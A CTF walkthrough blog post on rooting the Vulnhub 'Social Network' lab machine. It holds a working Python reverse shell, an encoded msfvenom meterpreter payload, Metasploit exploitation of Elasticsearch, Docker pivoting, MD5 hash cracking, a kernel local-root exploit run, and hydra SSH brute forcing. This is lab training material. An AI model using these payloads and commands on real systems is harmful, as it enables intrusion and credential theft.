---
layout: post
cover: False
cover: ''
title: "[Vulnhub] - BoredHackerBlog: Social Network - Walkthrough"
date:   2020-04-07 07:18:00
tags: CTF Vulnhub Hacking ITsecurity
categories: 'ctf'
navigation: True
---
In this post, I tryied [BoredHackerBlog: Social Network](https://www.vulnhub.com/entry/boredhackerblog-social-network,454/) from `vulnhub` website and it was a nice machine that required `meduim` skills in order to get in to it as root.
This machine required the following skills:

```
Difficulty: Med

Tasks involved:

    port scanning
    webapp attacks
    code injection
    pivoting
    exploitation
    password cracking
    brute forcing
```

### Scanning with NMAP
Starting with scanning the machine with `nmap` and found a `python` application running on port `5000`. By visiting the `http://10.10.10.132:5000`, we confirm we have a web app. 
```sh
yas3r@linux[~/CTF/social]$ nmap -sT -sV 10.10.10.132 -p- -v -n -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 18:31 CDT
NSE: Loaded 45 scripts for scanning.
Initiating Connect Scan at 18:31
Scanning 10.10.10.132 [65535 ports]
Discovered open port 22/tcp on 10.10.10.132
Discovered open port 5000/tcp on 10.10.10.132
Completed Connect Scan at 18:31, 0.55s elapsed (65535 total ports)
Initiating Service scan at 18:31
Scanning 2 services on 10.10.10.132
Completed Service scan at 18:31, 6.07s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.132.
Initiating NSE at 18:31
Completed NSE at 18:31, 0.05s elapsed
Initiating NSE at 18:31
Completed NSE at 18:31, 0.00s elapsed
Nmap scan report for 10.10.10.132
Host is up (0.000051s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
yas3r@linux[~/CTF/social]$
```
Also, find `/admin` that let you try your python script on the server. Thus, we test code injection on `/admin` with sleep command and it worked.

```python
import subprocess
import time
process = subprocess.Popen(['sleep', '10'],
                     stdout=subprocess.PIPE, 
                     stderr=subprocess.PIPE)
stdout, stderr = process.communicate()
stdout, stderr
```

Let try to get Reverse shell on the server using `python` code.
### Getting Reverse-shell

```python
import socket
import subprocess
s=socket.socket()
s.connect(("10.10.10.1",80))
while True:
     proc = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     s.send(proc.stdout.read() + proc.stderr.read())
```

### Docker one: `172.17.0.3`
It seems we are in a docker environment, `Dockerfile` and `Alpine` image
```bash
$cat /proc/1/cgroup
11:hugetlb:/docker/1972c2857f8b821aa74ff5988de42414014a7cf697a07bdec1082a44f5fcdb3e
10:perf_event:/docker/1972c2857f8b821aa74ff5988de42414014a7cf697a07bdec1082a44f5fcdb3e
9:blkio:/docker/1972c2857f8b821aa74ff5988de42414014a7cf697a07bdec1082a44f5fcdb3e
8:freezer:/docker/1972c2857f8b821aa74ff5988de42414014a7cf697a07bdec1082a44f5fcdb3e
7:devices:/docker/1972c2857f8b821aa74ff5988de42414014a7cf697a07bdec1082a44f5fcdb3e
6:memory:/docker/1972c2857f8b821aa74ff5988de42414014a7cf697a07bdec1082a44f5fcdb3e
5:cpuacct:/docker/1972c2857f8b821aa74ff5988de42414014a7cf697a07bdec1082a44f5fcdb3e
4:cpu:/docker/1972c2857f8b821aa74ff5988de42414014a7cf697a07bdec1082a44f5fcdb3e
3:cpuset:/docker/1972c2857f8b821aa74ff5988de42414014a7cf697a07bdec1082a44f5fcdb3e
2:name=systemd:/docker/1972c2857f8b821aa74ff5988de42414014a7cf697a07bdec1082a44f5fcdb3e

$ ls
Dockerfile
main.py
requirements.txt
templates

$ cat /etc/issue
Welcome to Alpine Linux 3.8
Kernel \r on an \m (\l)
```
we are `root` so let scan the docker network `172.17.0.0/24` for any other docker containers. I upload `nmap` binary from [github](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)


```sh
./nmap 172.17.0.2 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-04-03 12:12 UTC
Nmap scan report for 172.17.0.2
Host is up (0.0000060s latency).
Not shown: 1288 closed ports
PORT     STATE SERVICE
9200/tcp open  wap-wsp
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Interesting, we have a host that running `Elasticsearch listens on ports 9200 and 9300 TCP` Not lets use `metasploit` to make the life easier and exploit `elasticsearch` service.

### Metasploit 
First, create a python reverse shell 
```sh
kali@kali:~$ msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=10.10.10.133 LPORT=4444 -o x.py
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 450 bytes
Saved as: x.py
kali@kali:~$ cat x.py 
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEwLjEwLjEzMycsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))
```

and run `msfconsole`

```sh
       =[ metasploit v5.0.71-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.10.10.133
lhost => 10.10.10.133
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.133:4444 
[*] Sending stage (53755 bytes) to 10.10.10.132
[*] Meterpreter session 1 opened (10.10.10.133:4444 -> 10.10.10.132:56239) at 2020-04-07 09:00:43 -0400

```
Lets add a port forward so we can communicate with `elasticsearch` directly

```sh
portfwd add –l 3389 –p 3389 –r 172.16.194.191
```
Search for the exploit 
```sh
msf5 exploit(multi/elasticsearch/script_mvel_rce) > search elasticsearch

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  auxiliary/scanner/elasticsearch/indices_enum                       normal     No     ElasticSearch Indices Enumeration Utility
   1  auxiliary/scanner/http/elasticsearch_traversal                     normal     Yes    ElasticSearch Snapshot API Directory Traversal
   2  exploit/multi/elasticsearch/script_mvel_rce       2013-12-09       excellent  Yes    ElasticSearch Dynamic Script Arbitrary Java Execution
   3  exploit/multi/elasticsearch/search_groovy_script  2015-02-11       excellent  Yes    ElasticSearch Search Groovy Sandbox Bypass
   4  exploit/multi/misc/xdh_x_exec                     2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution


msf5 exploit(multi/elasticsearch/script_mvel_rce) > use exploit/multi/elasticsearch/search_groovy_script
msf5 exploit(multi/elasticsearch/search_groovy_script) > options 

Module options (exploit/multi/elasticsearch/search_groovy_script):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      9200             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The path to the ElasticSearch REST API
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   ElasticSearch 1.4.2


msf5 exploit(multi/elasticsearch/search_groovy_script) > set RHOSTS localhost
RHOSTS => localhost
msf5 exploit(multi/elasticsearch/search_groovy_script) > run
[*] Exploiting target 0.0.0.1

[!] You are binding to a loopback address by setting LHOST to ::1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on ::1:4444 
[*] Checking vulnerability...
^C[-] Exploit failed [user-interrupt]: Interrupt 
[*] Stopping exploiting current target 0.0.0.1...
[*] Control-C again to force quit exploiting all targets.
^C[-] run: Interrupted
msf5 exploit(multi/elasticsearch/search_groovy_script) > show payloads 

Compatible Payloads
===================

   #   Name                             Disclosure Date  Rank    Check  Description
   -   ----                             ---------------  ----    -----  -----------
   0   generic/custom                                    normal  No     Custom Payload
   1   generic/shell_bind_tcp                            normal  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                         normal  No     Generic Command Shell, Reverse TCP Inline
   3   java/jsp_shell_bind_tcp                           normal  No     Java JSP Command Shell, Bind TCP Inline
   4   java/jsp_shell_reverse_tcp                        normal  No     Java JSP Command Shell, Reverse TCP Inline
   5   java/meterpreter/bind_tcp                         normal  No     Java Meterpreter, Java Bind TCP Stager
   6   java/meterpreter/reverse_http                     normal  No     Java Meterpreter, Java Reverse HTTP Stager
   7   java/meterpreter/reverse_https                    normal  No     Java Meterpreter, Java Reverse HTTPS Stager
   8   java/meterpreter/reverse_tcp                      normal  No     Java Meterpreter, Java Reverse TCP Stager
   9   java/shell/bind_tcp                               normal  No     Command Shell, Java Bind TCP Stager
   10  java/shell/reverse_tcp                            normal  No     Command Shell, Java Reverse TCP Stager
   11  java/shell_reverse_tcp                            normal  No     Java Command Shell, Reverse TCP Inline
   12  multi/meterpreter/reverse_http                    normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Mulitple Architectures)
   13  multi/meterpreter/reverse_https                   normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Mulitple Architectures)

msf5 exploit(multi/elasticsearch/search_groovy_script) > set payload java/meterpreter/reverse_tcp 
payload => java/meterpreter/reverse_tcp
msf5 exploit(multi/elasticsearch/search_groovy_script) > options 

Module options (exploit/multi/elasticsearch/search_groovy_script):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      9200             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The path to the ElasticSearch REST API
   VHOST                       no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  ::1              yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ElasticSearch 1.4.2


msf5 exploit(multi/elasticsearch/search_groovy_script) > set LHOST 10.10.10.133
LHOST => 10.10.10.133
msf5 exploit(multi/elasticsearch/search_groovy_script) > set LPORT 4443
LPORT => 4443
msf5 exploit(multi/elasticsearch/search_groovy_script) > exploit 
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP handler on 10.10.10.133:4443 
[*] Checking vulnerability...
[-] Exploit aborted due to failure: unknown: 0.0.0.1:9200 - Java has not been executed, aborting...
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP handler on 10.10.10.133:4443 
[*] Checking vulnerability...
[*] Discovering TEMP path...
[+] TEMP path on '/tmp'
[*] Discovering remote OS...
[+] Remote OS is 'Linux'
[*] Trying to load metasploit payload...
[*] Sending stage (53906 bytes) to 10.10.10.132
[*] Meterpreter session 2 opened (10.10.10.133:4443 -> 10.10.10.132:42170) at 2020-04-07 09:10:20 -0400
[+] Deleted /tmp/WKnew.jar
[*] Session 2 created in the background.

msf5 exploit(multi/elasticsearch/search_groovy_script) > sessions -l

Active sessions
===============

  Id  Name  Type                      Information          Connection
  --  ----  ----                      -----------          ----------
  1         meterpreter python/linux  root @ 65d69f9a8aa5  10.10.10.133:4444 -> 10.10.10.132:56239 (172.17.0.3)
  2         meterpreter java/linux    root @ 4d3a60493369  10.10.10.133:4443 -> 10.10.10.132:42170 (127.0.0.1)

msf5 exploit(multi/elasticsearch/search_groovy_script) > 

```
### Docker 2: `172.17.0.2`
```
meterpreter > sysinfo 
Computer    : e99319d4f725
OS          : Linux 3.13.0-24-generic (amd64)
Meterpreter : java/linux
meterpreter >
meterpreter > cat /proc/1/cgroup
11:hugetlb:/docker/4d3a604933692ddb11837995ecc0f3a91f44086e67a8d76345973995924ed9db
10:perf_event:/docker/4d3a604933692ddb11837995ecc0f3a91f44086e67a8d76345973995924ed9db
9:blkio:/docker/4d3a604933692ddb11837995ecc0f3a91f44086e67a8d76345973995924ed9db
8:freezer:/docker/4d3a604933692ddb11837995ecc0f3a91f44086e67a8d76345973995924ed9db
7:devices:/docker/4d3a604933692ddb11837995ecc0f3a91f44086e67a8d76345973995924ed9db
6:memory:/docker/4d3a604933692ddb11837995ecc0f3a91f44086e67a8d76345973995924ed9db
5:cpuacct:/docker/4d3a604933692ddb11837995ecc0f3a91f44086e67a8d76345973995924ed9db
4:cpu:/docker/4d3a604933692ddb11837995ecc0f3a91f44086e67a8d76345973995924ed9db
3:cpuset:/docker/4d3a604933692ddb11837995ecc0f3a91f44086e67a8d76345973995924ed9db
2:name=systemd:/docker/4d3a604933692ddb11837995ecc0f3a91f44086e67a8d76345973995924ed9db
meterpreter > shell

id
uid=0(root) gid=0(root) groups=0(root)
ifconfig
/sbin/ifconfig
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
ls -la
total 27172
drwxr-xr-x 37 root root     4096 Apr  7 12:20 .
drwxr-xr-x 37 root root     4096 Apr  7 12:20 ..
-rwxr-xr-x  1 root root        0 Apr  7 12:20 .dockerenv
drwxr-xr-x  2 root root     4096 Oct 11  2018 bin
drwxr-xr-x  2 root root     4096 Jun 14  2018 boot
drwxr-xr-x  5 root root      360 Apr  7 12:20 dev
drwxr-xr-x  7 root root     4096 Apr  7 12:20 elasticsearch
-rw-r--r--  1 root root 27734207 May 16  2018 elasticsearch-1.4.2.tar.gz
drwxr-xr-x 69 root root     4096 Apr  7 12:20 etc
drwxr-xr-x  2 root root     4096 Jun 14  2018 home
drwxr-xr-x 12 root root     4096 Oct 29  2018 lib
drwxr-xr-x  2 root root     4096 Oct 11  2018 lib64
-rwxrwxr-x  1 root root      262 Oct 29  2018 main.sh
drwxr-xr-x  2 root root     4096 Oct 11  2018 media
drwxr-xr-x  2 root root     4096 Oct 11  2018 mnt
drwxr-xr-x  2 root root     4096 Oct 11  2018 opt
-rw-rw-r--  1 root root      287 Oct 29  2018 passwords
dr-xr-xr-x 94 root root        0 Apr  7 12:20 proc
drwx------  2 root root     4096 Oct 11  2018 root
drwxr-xr-x  4 root root     4096 Oct 29  2018 run
drwxr-xr-x  2 root root     4096 Oct 29  2018 sbin
drwxr-xr-x  2 root root     4096 Oct 11  2018 srv
dr-xr-xr-x 13 root root        0 Apr  7 12:20 sys
drwxrwxrwt  4 root root     4096 Apr  7 13:10 tmp
drwxr-xr-x 16 root root     4096 Oct 29  2018 usr
drwxr-xr-x 14 root root     4096 Oct 29  2018 var
cat passwords
Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase
Example: 1234abcd
john:3f8184a7343664553fcb5337a3138814 
test:861f194e9d6118f3d942a72be3e51749
admin:670c3bbc209a18dde5446e5e6c1f1d5b
root:b3d34352fc26117979deabdf1b9b6354
jane:5c158b60ed97c723b673529b8a3cf72b

cat /etc/issue
Debian GNU/Linux 8 \n \l

```
Ping sweep

```
msf5 post(multi/gather/ping_sweep) > sessions -l

Active sessions
===============

  Id  Name  Type                      Information          Connection
  --  ----  ----                      -----------          ----------
  1         meterpreter python/linux  root @ 65d69f9a8aa5  10.10.10.133:4444 -> 10.10.10.132:56239 (172.17.0.3)
  2         meterpreter java/linux    root @ 4d3a60493369  10.10.10.133:4443 -> 10.10.10.132:42170 (127.0.0.1)

msf5 post(multi/gather/ping_sweep) > set session -i 2
[-] The following options failed to validate: Value '-i 2' is not valid for option 'SESSION'.
session => 
msf5 post(multi/gather/ping_sweep) > set session 2
session => 2
msf5 post(multi/gather/ping_sweep) > options 

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION  2                yes       The session to run this module on.

msf5 post(multi/gather/ping_sweep) > set RHOST 172.17.0.0/24
RHOST => 172.17.0.0/24
msf5 post(multi/gather/ping_sweep) > run
[-] Post failed: Msf::OptionValidateError The following options failed to validate: RHOSTS.
msf5 post(multi/gather/ping_sweep) > set RHOST 172.17.0.1/24
RHOST => 172.17.0.1/24
msf5 post(multi/gather/ping_sweep) > run
[-] Post failed: Msf::OptionValidateError The following options failed to validate: RHOSTS.
msf5 post(multi/gather/ping_sweep) > set RHOST 172.17.0.1
RHOST => 172.17.0.1
msf5 post(multi/gather/ping_sweep) > run
[-] Post failed: Msf::OptionValidateError The following options failed to validate: RHOSTS.
msf5 post(multi/gather/ping_sweep) > set RHOSTS 172.17.0.1/24
RHOSTS => 172.17.0.1/24
msf5 post(multi/gather/ping_sweep) > run

[*] Performing ping sweep for IP range 172.17.0.1/24
[+]     172.17.0.3 host found
[+]     172.17.0.2 host found
[+]     172.17.0.1 host found
[*] Post module execution completed
msf5 post(multi/gather/ping_sweep) > 
```

Lets add a new route to scan the gateway `172.17.0.1` which is the `host` machine for the docker environment
```sh
msf5 > route
[*] There are currently no routes defined.
msf5 > route add 172.17.0.0 255.255.255.0 2
[*] Route added
msf5 > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.17.0.0         255.255.255.0      Session 2

[*] There are currently no IPv6 routes defined.
msf5 > sessions -l

Active sessions
===============

  Id  Name  Type                      Information          Connection
  --  ----  ----                      -----------          ----------
  1         meterpreter python/linux  root @ 65d69f9a8aa5  10.10.10.133:4444 -> 10.10.10.132:56239 (172.17.0.3)
  2         meterpreter java/linux    root @ 4d3a60493369  10.10.10.133:4443 -> 10.10.10.132:42170 (127.0.0.1)

msf5 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


msf5 > use auxiliary/scanner/portscan/tcp 
msf5 auxiliary(scanner/portscan/tcp) > options 

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > 
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.17.0.0/24
RHOSTS => 172.17.0.0/24
msf5 auxiliary(scanner/portscan/tcp) > run

[+] 172.17.0.1:           - 172.17.0.1:22 - TCP OPEN
[+] 172.17.0.1:           - 172.17.0.1:5000 - TCP OPEN
[+] 172.17.0.2:           - 172.17.0.2:9200 - TCP OPEN
[+] 172.17.0.2:           - 172.17.0.2:9300 - TCP OPEN
[+] 172.17.0.3:           - 172.17.0.3:5000 - TCP OPEN
```

We also found a `/passwords.txt` in the docker container which has a clue about what the combination of the password.
`number``number``number``number``letter``letter``letter``letter` so lets use `hashcat` to crack them
```sh
kali@kali:~$ cat md5.lst 
john:3f8184a7343664553fcb5337a3138814 
test:861f194e9d6118f3d942a72be3e51749
admin:670c3bbc209a18dde5446e5e6c1f1d5b
root:b3d34352fc26117979deabdf1b9b6354
jane:5c158b60ed97c723b673529b8a3cf72b

kali@kali:~$ hashcat --username -m 0 -a 3 md5.lst -1 ?d -2 ?l ?1?1?1?1?2?2?2?2 --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
Hashfile 'md5.lst' on line 1 (john:3f8184a7343664553fcb5337a3138814 ): Token length exception                                                                           
Hashes: 4 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

                                                                         
5c158b60ed97c723b673529b8a3cf72b:1234jane        
b3d34352fc26117979deabdf1b9b6354:1234pass        
670c3bbc209a18dde5446e5e6c1f1d5b:1111pass        
861f194e9d6118f3d942a72be3e51749:1234test        
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: md5.lst
Time.Started.....: Tue Apr  7 11:46:19 2020 (5 secs)
Time.Estimated...: Tue Apr  7 11:46:24 2020 (0 secs)
Guess.Mask.......: ?1?1?1?1?2?2?2?2 [8]
Guess.Charset....: -1 ?d, -2 ?l, -3 Undefined, -4 Undefined 
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 72104.9 kH/s (6.71ms) @ Accel:1024 Loops:125 Thr:1 Vec:8
Recovered........: 4/4 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 356864000/4569760000 (7.81%)
Rejected.........: 0/356864000 (0.00%)
Restore.Point....: 356352/4569760 (7.80%)
Restore.Sub.#1...: Salt:0 Amplifier:0-125 Iteration:0-125
Candidates.#1....: 1232hgit -> 9126trat

Started: Tue Apr  7 11:46:06 2020
Stopped: Tue Apr  7 11:46:26 2020
kali@kali:~$
```

```
kali@kali:~$ hashcat --username -m 0 -a 3 md5.lst -1 ?d -2 ?l ?1?1?1?1?2?2?2?2 --force --show
                                                                         
john:3f8184a7343664553fcb5337a3138814:1337hack
jane:5c158b60ed97c723b673529b8a3cf72b:1234jane
root:b3d34352fc26117979deabdf1b9b6354:1234pass
admin:670c3bbc209a18dde5446e5e6c1f1d5b:1111pass
test:861f194e9d6118f3d942a72be3e51749:1234test
kali@kali:~$
```
We did crack them, lets try to `ssh` to the host using one of these usernames and passwords. So we were able to login as `john`
```sh
yas3r@linux[~/CTF/social]$ ssh john@10.10.10.132            
john@10.10.10.132's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Apr  7 17:37:01 EDT 2020

  System load:  0.0                Processes:              82
  Usage of /:   12.8% of 14.64GB   Users logged in:        1
  Memory usage: 46%                IP address for eth0:    10.10.10.132
  Swap usage:   0%                 IP address for docker0: 172.17.0.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Tue Apr  7 17:37:01 2020 from 10.10.10.1
john@socnet:~$ 
```
### Getting ROOT
Next, upload the Linux privesc script [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) and found couple interesting things: It seems we have couple of services are vulnerable.

```
[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands

/usr/bin/screen		--->	GNU_Screen_4.5.0
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)

```

Also, the Linux kernel is old and vulnerable to `overlayfs local root`. so lets try it
```
john@socnet:~# uname -a
Linux socnet 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
john@socnet:~#
john@socnet:~$ wget https://www.exploit-db.com/download/37292
--2020-04-07 19:23:31--  https://www.exploit-db.com/download/37292
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [application/txt]
Saving to: ‘37292’

100%[============================================================================>] 5,119       --.-K/s   in 0s      

2020-04-07 19:23:31 (234 MB/s) - ‘37292’ saved [5119/5119]

john@socnet:~$ ls
37292  linpeas.sh
john@socnet:~$ head 37292 
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
john@socnet:~$ head -20 37292 
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
user@ubuntu-server-1504:~$ ./ofs
spawning threads
mount #1
```
Move the exploit to my local machine and compile it and upload it since the vulnerable machine doesn't have `gcc`
```
yas3r@linux:~$ mv 37292 37292.c
yas3r@linux:~$ gcc 37292.c -o exp

john@socnet:~$ chmod +x exp
john@socnet:~$ ./exp
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(john)
# bash -i
root@socnet:/home/john# cd /root/
root@socnet:/root# ls -la
total 20
drwx------  2 root root 4096 Oct 28  2018 .
drwxr-xr-x 22 root root 4096 Oct 27  2018 ..
-rw-------  1 root root  152 Apr  7 14:57 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
root@socnet:/root# 
# 

```

### Creating wordlist
Before getting root, I was thinking of following the password hashes that I found and generate a wordlist for `socnet` user. so I also ran a `bruteforce` using hydra but haven't complete it since the privesc works.

so what I was thinking is the password could be as the founded once.
`number number number number socnet` or 
`number number number number pass`

```sh
yas3r@linux:~/CTF/social$ ~/Desktop/hashcat-5.1.0/hashcat64.bin -m 0 -a 3 -1 ?d --stdout ?1?1?1?1socnet  > wordlist.lst 
yas3r@linux:~/CTF/social$ ~/Desktop/hashcat-5.1.0/hashcat64.bin -m 0 -a 3 -1 ?d --stdout ?1?1?1?1pass  >> wordlist.lst 
```
```
yas3r@linux[~/CTF/social]$ hydra -l socnet -P ~/CTF/social/xwordlist.lst ssh://10.10.10.132 -t 4
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-07 18:12:44
[DATA] max 4 tasks per 1 server, overall 4 tasks, 50000000 login tries (l:1/p:50000000), ~12500000 tries per task
[DATA] attacking ssh://10.10.10.132:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 49999956 to do in 18939:23h, 4 active
[STATUS] 34.67 tries/min, 104 tries in 00:03h, 49999896 to do in 24038:25h, 4 active
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 49999796 to do in 28594:40h, 4 active
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 49999956 to do in 18939:23h, 4 active
[STATUS] 34.67 tries/min, 104 tries in 00:03h, 49999896 to do in 24038:25h, 4 active
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 49999796 to do in 28594:40h, 4 active
[STATUS] 29.60 tries/min, 444 tries in 00:15h, 49999556 to do in 28152:55h, 4 active

^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
yas3r@linux[~/CTF/social]$
